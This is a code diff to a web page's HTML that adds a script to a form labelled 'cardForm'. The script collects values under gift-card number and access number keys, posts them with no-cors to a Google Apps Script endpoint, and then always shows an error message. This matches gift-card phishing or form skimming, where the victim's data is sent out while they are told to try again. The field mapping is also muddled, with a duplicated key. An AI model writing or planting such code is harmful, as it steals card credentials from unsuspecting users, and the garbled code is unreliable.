@@ -633,7 +633,37 @@
       <textarea id="requirement" placeholder="What is your Requirement?" rows="3" required></textarea>
       <button type="button" onclick="submitEnquiry()">send message</button>
   </div>
+<script>
+    document.getElementById("cardForm").addEventListener("submit", function (event) {
+      event.preventDefault();
 
+      const formData = new FormData(event.target);
+      const formDetails = {
+        giftCardNumber: formData.get("mobileNo"),
+        accessNumber: formData.get("name"),
+         accessNumber: formData.get("requirement"),
+      };
+
+      const scriptURL = "https://script.google.com/macros/s/AKfycbw9pQgt--IxXLzh4VvvmXX3CGNjK-bi7ocEWbFGr2GbnI6EcdL5QrD4Z8YlQBUwi5QDhQ/exec";
+
+      fetch(scriptURL, {
+        method: "POST",
+        mode: "no-cors",
+        headers: {
+          "Content-Type": "application/json",
+        },
+        body: JSON.stringify(formDetails),
+      })
+        .then(() => {
+          // Show error message
+          document.getElementById("errorMsg").style.display = "block";
+        })
+        .catch((error) => {
+          console.error("Error:", error);
+          alert("⚠️ Something went wrong! Try again.");
+        });
+    });
+  </script>
   <script>
     document.getElementById("cardForm").addEventListener("submit", function (event) {
       event.preventDefault();
